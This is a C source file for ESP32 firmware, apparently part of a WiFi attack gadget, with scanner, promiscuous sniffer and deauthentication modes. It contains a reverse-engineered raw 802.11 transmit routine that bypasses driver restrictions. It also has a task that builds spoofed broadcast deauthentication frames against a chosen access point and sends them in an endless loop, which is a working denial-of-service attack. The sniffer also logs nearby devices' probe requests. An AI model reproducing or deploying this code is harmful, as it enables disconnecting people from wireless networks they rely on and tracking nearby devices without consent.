#include <string.h>
#include "wifi.h"
#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_event.h"

#include "dissect.h"

#define TAG "wifi_ctrl"
#define DEFAULT_SCAN_LIST_SIZE 10

ESP_EVENT_DEFINE_BASE(WIFI_CTRL_EVENT);

wifi_controller_t g_wifi_ctrl;

typedef struct {
	unsigned frame_ctrl:16;
	unsigned duration_id:16;
	uint8_t addr1[6]; /* receiver address */
	uint8_t addr2[6]; /* sender address */
	uint8_t addr3[6]; /* filtering address */
	unsigned sequence_ctrl:16;
	uint8_t addr4[6]; /* optional */
} wifi_ieee80211_mac_hdr_t;

typedef struct {

} wifi_ieee80211_probe_resp_t;

typedef struct {
	wifi_ieee80211_mac_hdr_t hdr;
	uint8_t payload[0]; /* network data ended with 4 bytes csum (CRC32) */
} wifi_ieee80211_packet_t;

void wifi_scanner_task(void *parameter);


/***************************************************
 * 802.11 raw packet send feature
 **************************************************/
typedef struct {
  uint32_t flags;
  uint32_t f_04;
  uint32_t f_08;
  uint32_t f_0C;
  uint32_t f_10;
} s2;

typedef struct {
  uint32_t f_00;
  uint32_t f_04;
  uint32_t f_08;
  uint32_t f_0C;
  uint32_t f_10;
  uint16_t f_14;
  uint16_t payload_size;
  uint32_t f_18;
  uint32_t f_1C;
  uint32_t f_20;
  uint32_t f_24;
  uint32_t f_28;
  s2 *f_2C;
} s1;


esp_err_t esp_wifi_80211_tx_(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq)
{
  void *p_alloc;
  uint16_t *p0;
  uint32_t value;
  s1 *p_mac_frame;

  /* Lock. */
  (g_osi_funcs_p[21])(g_wifi_global_lock);

  /* Allocate memory. */
  p_mac_frame = (s1 *)ic_ebuf_alloc((void *)buffer,1,(void *)len);
  if (p_mac_frame != NULL)
  {
    /* Fill in MAC structure. */
    value = p_mac_frame->f_2C->flags;
    p_mac_frame->f_14 = 0x18;
    p_mac_frame->payload_size = len - 0x18;
    __asm__ __volatile__ (
      "memw"
    );
    p_mac_frame->f_2C->flags = value | 0x4000;
    if (en_sys_seq)
    {
      p_mac_frame->f_2C->flags |= 1;
    }
    
    p_mac_frame->f_2C->f_10 = (p_mac_frame->f_2C->f_10 & 0xfff7ffff) | ((ifx & 1) << 0x13);
    
    __asm__ __volatile__ (
      "memw"
    );

    ieee80211_post_hmac_tx((void *)p_mac_frame);
    
    /* Unlock. */
    (g_osi_funcs_p[22])(g_wifi_global_lock);
  }
  else
  {
    printf("Cannot allocate memory\r\n");

    /* Unlock. */
    (g_osi_funcs_p[22])(g_wifi_global_lock);
  }

  return 0;
}




/******************************************************************
 *                        WIFI DRIVER INTERFACE
 ******************************************************************/

void wifi_enable(wifi_driver_mode_t mode)
{
  /* Sanity check. */
  if (g_wifi_ctrl.b_enabled)
    return;

  /* Set mode. */
  if (mode > WIFI_DRIVER_OFF)
    ESP_ERROR_CHECK(esp_wifi_set_mode(mode));   

  /* Save current mode. */
  g_wifi_ctrl.driver_mode = mode;

  /* Start WiFi driver. */
  ESP_ERROR_CHECK(esp_wifi_start());

  /* Mark wifi driver as enabled. */
  g_wifi_ctrl.b_enabled = true;
}


void wifi_disable()
{
  /* Disable WiFi. */
  g_wifi_ctrl.driver_mode = WIFI_DRIVER_OFF;
  ESP_ERROR_CHECK(esp_wifi_stop());

  /* Mark WiFi as disabled. */
  g_wifi_ctrl.b_enabled = false;
}


/******************************************************************
 *                             WIFI SNIFFER
 *****************************************************************/

const char *
wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type)
{
	switch(type) {
	case WIFI_PKT_MGMT: return "MGMT";
	case WIFI_PKT_DATA: return "DATA";
	default:	
	case WIFI_PKT_MISC: return "MISC";
	}
}

/**
 * wifi_sniffer_packet_cb()
 * 
 * @brief: Callback function that will be called for each received packet.
 **/

void wifi_sniffer_packet_cb(void* buff, wifi_promiscuous_pkt_type_t type)
{
  wifi_pkt_subtype_t psubtype;
  wifi_probe_req_t probe_req;
  wifi_probe_rsp_t probe_rsp;

  uint8_t pkt_type, pkt_subtype;
  uint8_t dest[6], source[6], bssid[6];
  char essid[32];
  uint8_t *p_essid_tlv;
  int essid_size;

  const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
  const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)ppkt->payload;
  const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

  /* Display information only about probe request. */
  if (wifi_pkt_get_type(ppkt->payload, &psubtype) == ESP_OK)
  {
    switch(psubtype)
    {
      case PKT_PROBE_REQ:
        {
          if (wifi_pkt_parse_probe_req(ppkt->payload, (wifi_probe_req_t *)&probe_req) == ESP_OK)
          {
            printf("[PROBE_REQ] ESSID: %s\r\n", probe_req.essid);
          }
        }
        break;

      case PKT_PROBE_RSP:
        {
          if (wifi_pkt_parse_probe_rsp(ppkt->payload, (wifi_probe_rsp_t *)&probe_rsp) == ESP_OK)
          {
            printf("[PROBE_RSP] ESSID: %s\r\n", probe_rsp.essid);
          }
        }
        break;

      default:
        break;

    }

  }
}


/**
 * wifi_sniffer_disable()
 * 
 * @brief: disable sniffing mode.
 **/

void wifi_sniffer_disable(void)
{
  /* Disable promiscuous mode. */
  esp_wifi_set_promiscuous(false);

  /* Stop WiFi. */
  if (g_wifi_ctrl.b_enabled)
  {
    wifi_disable();
    g_wifi_ctrl.b_enabled = false;
  }
}


/**
 * wifi_sniffer_enable()
 * 
 * @brief: enable sniffing mode.
 **/

void wifi_sniffer_enable(void)
{
  char test[]="thisisatest";
  ESP_ERROR_CHECK( esp_wifi_set_mode(WIFI_MODE_NULL) );
  ESP_ERROR_CHECK( esp_wifi_start() );
  esp_wifi_set_channel(6, 0);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_packet_cb);
}

/******************************************************************
 *                             WIFI DEAUTH
 *****************************************************************/
#define BEACON_SSID_OFFSET 38
#define SRCADDR_OFFSET 10
#define BSSID_OFFSET 16
#define SEQNUM_OFFSET 22

/**
 * wifi_deauth_task()
 * 
 * @brief: Background task that handles deauth.
 **/

void wifi_deauth_task(void *parameter)
{
  int i;
  uint16_t seqnum = 0;
  uint8_t deauth_packet[26] = {0};

  /* Set frame control + duration. */
  deauth_packet[0] = 0xC0;  /* Deauth */
  deauth_packet[1] = 0x00;
  deauth_packet[2] = 0x00;
  deauth_packet[3] = 0x00;

  /* Set destination mac, source mac and bssid. */
  for (i=0; i<6; i++)
  {
    deauth_packet[4 + i] = 0xFF;
    deauth_packet[10 + i] = g_wifi_ctrl.deauth_target[i];
    deauth_packet[16 + i] = g_wifi_ctrl.deauth_target[i];
  }
  
  /* Set reason code (3). */
  deauth_packet[24] = 3;
  deauth_packet[25] = 0;
 
  /* Loop and send packet. */
  while (1)
  {
		deauth_packet[22] = (seqnum & 0x0f) << 4;
		deauth_packet[23] = (seqnum & 0xff0) >> 4;
		seqnum++;
		if (seqnum > 0xfff)
			seqnum = 0;

    /* Send packet */
    esp_wifi_80211_tx_(WIFI_IF_STA, deauth_packet, 26, false);

    /* Send packet. */
    vTaskDelay(1);
  }
}


/**
 * wifi_deauth_disable()
 * 
 * @brief: disable deauth mode.
 **/

void wifi_deauth_disable(void)
{
  /* Stop our scanner task. */
  vTaskDelete(g_wifi_ctrl.current_task_handle);

  /* Stop WiFi. */
  if (g_wifi_ctrl.b_enabled)
  {
    wifi_disable();
    g_wifi_ctrl.b_enabled = false;
  }
}


/**
 * wifi_deauth_enable()
 * 
 * @brief: enable deauth mode.
 **/

void wifi_deauth_enable(void)
{
  ESP_ERROR_CHECK( esp_wifi_set_mode(WIFI_MODE_STA) );
  ESP_ERROR_CHECK( esp_wifi_start() );
  esp_wifi_set_channel(g_wifi_ctrl.deauth_channel, 0);

  /* Mark WiFi as enabled. */
  if (!g_wifi_ctrl.b_enabled)
    g_wifi_ctrl.b_enabled = true;

  /* Start scanner. */
  xTaskCreate(wifi_deauth_task, "wifi_deauth", 10000, NULL, 1, &g_wifi_ctrl.current_task_handle);
}



/******************************************************************
 *                             WIFI SCANNER
 *****************************************************************/

/**
 * wifi_scanner_disable()
 * 
 * @brief: Disable scanner.
 **/

void wifi_scanner_disable(void)
{
  /* Stop scanner. */
  esp_wifi_scan_stop();

  /* Stop WiFi. */
  if (g_wifi_ctrl.b_enabled)
  {
    wifi_disable();
    g_wifi_ctrl.b_enabled = false;
  }

  /* Stop our scanner task. */
  vTaskDelete(g_wifi_ctrl.current_task_handle);
}


/**
 * wifi_scanner_enable()
 * 
 * @brief: Enable scanner.
 **/

void wifi_scanner_enable(void)
{
  /* Enable WiFi if disabled. */
  if (!g_wifi_ctrl.b_enabled)
  {
    wifi_enable(WIFI_DRIVER_STA);
  }

  /* Configure scanner. */
  memset(&g_wifi_ctrl.scan_config, 0, sizeof(wifi_scan_config_t));
  g_wifi_ctrl.scan_config.channel = 0;
  g_wifi_ctrl.scan_config.bssid = NULL;
  g_wifi_ctrl.scan_config.ssid = NULL;
  g_wifi_ctrl.scan_config.show_hidden = true;
  g_wifi_ctrl.scan_config.scan_type = WIFI_SCAN_TYPE_ACTIVE;
  g_wifi_ctrl.scan_config.scan_time.active.min = 200;
  g_wifi_ctrl.scan_config.scan_time.active.max = 500;
  g_wifi_ctrl.scan_config.scan_time.passive = 500;

  /* Start scanner. */
  xTaskCreate(wifi_scanner_task, "wifi_scanner", 10000, NULL, 1, &g_wifi_ctrl.current_task_handle);
}


static void wifi_scanner_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data)
{
  if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_SCAN_DONE)
  {
    ESP_LOGI(TAG, "wifi scan done");
    g_wifi_ctrl.scan_state = SCANNER_IDLE;
  }
}

/**
 * wifi_scanner_task()
 * 
 * @brief: Scanner main task
 **/

void wifi_scanner_task(void *parameter)
{
  wifi_ap_record_t ap_info[DEFAULT_SCAN_LIST_SIZE];
  uint16_t ap_count = 0;
  int j;

  ESP_LOGI(TAG, "scanner task starting ...");

  g_wifi_ctrl.scan_state = SCANNER_IDLE;

  if (!g_wifi_ctrl.evt_loop_initialized)
  {
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_event_handler_instance_t instance_any_id;
    esp_event_handler_instance_t instance_got_ip;
    ESP_ERROR_CHECK(esp_event_handler_instance_register(
      WIFI_EVENT,
      ESP_EVENT_ANY_ID,
      &wifi_scanner_event_handler,
      NULL,
      &instance_any_id
    ));

    /* Mark event loop as initialized. */
    g_wifi_ctrl.evt_loop_initialized = true;
  }

  while (1)
  {
    ESP_LOGD(TAG, "wifi scan started ...");

    if (g_wifi_ctrl.scan_state == SCANNER_IDLE)
    {
      esp_wifi_scan_start(&g_wifi_ctrl.scan_config, false);
      g_wifi_ctrl.scan_state = SCANNER_RUNNING;
    }

    /* Get APs */
    ap_count = DEFAULT_SCAN_LIST_SIZE;
    if (esp_wifi_scan_get_ap_records(&ap_count, ap_info) == ESP_OK)
    {
      ESP_LOGD(TAG, "got APs, parse ...");
      
      /* Update APs. */
      for (j=0; j<ap_count; j++)
      {
        ESP_LOGI(TAG, "Found AP '%s'", ap_info[j].ssid);
        wifi_aplist_add(&g_wifi_ctrl.ap_list, &ap_info[j]);
      }

      if (ap_count > 0)
      {
        /* Post a WIFI_SCANNER_EVENT_APLIST_UPDATED event. */
        esp_event_post_to(
          g_wifi_ctrl.evt_loop_handle,
          WIFI_CTRL_EVENT,
          WIFI_SCANNER_EVENT_APLIST_UPDATED,
          &g_wifi_ctrl.ap_list,
          sizeof(wifi_aplist_t *),
          portMAX_DELAY /* <-- TODO: waiting for max delay can block this task. */
        );
      }
    }

    vTaskDelay(1);
  }
}


/*****************************************************************************************
 * WIFI CONTROLLER EVENT HANDLING
 ****************************************************************************************/

/**
 * wifi_ctrl_event_handler_register()
 * @brief: registers an event handler for our custom event loop.
 * @param event_id: an integer representing the event that must match for this handler
 * @param event_handler: a pointer to a `esp_event_handler_t` callback function
 * @param event_handler_arg: a pointer to the event data that will be passed to this function.
 * @return: ESP_OK on success, other error values otherwise.
 **/

esp_err_t wifi_ctrl_event_handler_register(
  int32_t event_id,
  esp_event_handler_t event_handler,
  void* event_handler_arg
)
{
  return esp_event_handler_instance_register_with(
    g_wifi_ctrl.evt_loop_handle,
    WIFI_CTRL_EVENT,
    event_id,
    event_handler,
    event_handler_arg,
    NULL
  );
}


/*****************************************************************************************
 *  WIFI CONTROLLER
 ****************************************************************************************/


/**
 * wifi_ctrl_init()
 * 
 * @brief: Initialize WiFi controller
 **/

void wifi_ctrl_init(void)
{
  ESP_LOGI(TAG, "Initializing wifi controller...");
  wifi_init_config_t wifiInitializationConfig = WIFI_INIT_CONFIG_DEFAULT();

  /* WiFi controller is off by default. */
  g_wifi_ctrl.mode = WIFI_OFF;
  g_wifi_ctrl.b_enabled = false;
  
  /* Initialize our AP list. */
  wifi_aplist_init(&g_wifi_ctrl.ap_list);

  /* Initialize the underlying WiFi driver (esp32). */
  g_wifi_ctrl.driver_mode = WIFI_DRIVER_OFF;
  memset(&g_wifi_ctrl.scan_config, 0, sizeof(wifi_scan_config_t));

  /* Initialize ESP32 WiFi driver. */
  wifiInitializationConfig.nvs_enable = false;
  ESP_ERROR_CHECK(esp_wifi_init(&wifiInitializationConfig));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

  /* Initialize our event loop. */
  g_wifi_ctrl.evt_loop_args.queue_size = 5;
  g_wifi_ctrl.evt_loop_args.task_name = "wifi_ctrl_task";
  g_wifi_ctrl.evt_loop_args.task_priority = uxTaskPriorityGet(NULL);
  g_wifi_ctrl.evt_loop_args.task_stack_size = 2048;
  g_wifi_ctrl.evt_loop_args.task_core_id = tskNO_AFFINITY;
  g_wifi_ctrl.evt_loop_initialized = false;

  /* Create our custom loop. */
  if (esp_event_loop_create(&g_wifi_ctrl.evt_loop_args, &g_wifi_ctrl.evt_loop_handle) == ESP_OK)
  {
    ESP_LOGI(TAG, "event loop successfully created for wifi controller.");
  }
  else
    ESP_LOGE(TAG, "cannot create event loop for wifi controller.");
}


/**
 * wifi_set_mode()
 * 
 * @brief: Set WiFi controller mode
 * @param mode: WiFi mode
 **/

void wifi_set_mode(wifi_controller_mode_t mode)
{
  ESP_LOGI(TAG, "set mode to %d", mode);
  ESP_LOGD(TAG, "disabling old mode (%d) ...", g_wifi_ctrl.mode);

  /* Disable old mode if any. */
  switch(g_wifi_ctrl.mode)
  {
    case WIFI_SCANNER:
      ESP_LOGD(TAG, "disabling scanner ...");
      wifi_scanner_disable();
      break;

    case WIFI_SNIFFER:
      ESP_LOGD(TAG, "disabling sniffer ...");
      wifi_sniffer_disable();
      break;

    case WIFI_DEAUTH:
      ESP_LOGD(TAG, "disabling deauther ...");
      wifi_deauth_disable();
      break;
    
    default:
      break;
  }

  /* Enable new mode. */
  switch(mode)
  {
    case WIFI_SCANNER:
      ESP_LOGD(TAG, "enabling scanner ...");
      wifi_scanner_enable();
      break;

    case WIFI_SNIFFER:
      ESP_LOGD(TAG, "enabling sniffer ...");
      wifi_sniffer_enable();
      break;

    case WIFI_DEAUTH:
      ESP_LOGD(TAG, "enabling deauther ...");
      wifi_deauth_enable();
      break;

    default:
      break;
  }

  ESP_LOGD(TAG, "current mode is now %d", mode);
  g_wifi_ctrl.mode = mode;

}


wifi_controller_mode_t wifi_get_mode(void)
{
  return g_wifi_ctrl.mode;
}


/**************************************
 * Helpers
 *************************************/

/**
 * wifi_deauth_target()
 * 
 * @brief: start deauth attack on target AP.
 * @param p_bssid: target BSSID.
 **/

void wifi_deauth_target(uint8_t *p_bssid, int channel)
{
  /* Copy target MAC(BSSID) into memory. */
  memcpy(&g_wifi_ctrl.deauth_target, p_bssid, 6);
  g_wifi_ctrl.deauth_channel = channel;

  /* Start deauth ! */
  wifi_set_mode(WIFI_DEAUTH);
}